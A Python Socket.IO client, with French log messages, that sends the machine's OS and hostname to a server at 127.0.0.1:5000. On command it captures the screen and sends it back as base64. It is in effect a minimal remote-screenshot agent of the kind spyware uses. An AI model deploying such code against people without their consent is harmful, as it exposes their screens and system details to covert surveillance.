import base64
import io
import platform
import time

import pyautogui
import socketio
from PIL import Image

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2)

system_info = {
    'os': platform.system(),
    'os_version': platform.version(),
    'hostname': platform.node()
}


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', system_info)


@sio.event
def connect_error(data):
    log_event(f"Connection echouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    if command == 'screenshot':
        log_event("Commande de capture d'écran reçue")
        take_and_send_screenshot()
    else:
        log_event(f"Commande non reconnue: {command}")


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def take_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)

        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()

        if not sio.connected:
            log_event("En attente de connexion pour envoyer la capture d'écran...")
            time.sleep(1)
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
        log_event("Capture d'écran envoyée")
    except Exception as e:
        log_event(f"Echec de la capture d'écran: {e}")


def attempt_reconnect():
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect('http://127.0.0.1:5000')
            time.sleep(5)
        except socketio.exceptions.ConnectionError:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)


def main():
    attempt_reconnect()
    try:
        sio.wait()
    except KeyboardInterrupt:
        log_event("Arrêt du client...")
        sio.disconnect()


if __name__ == '__main__':
    main()
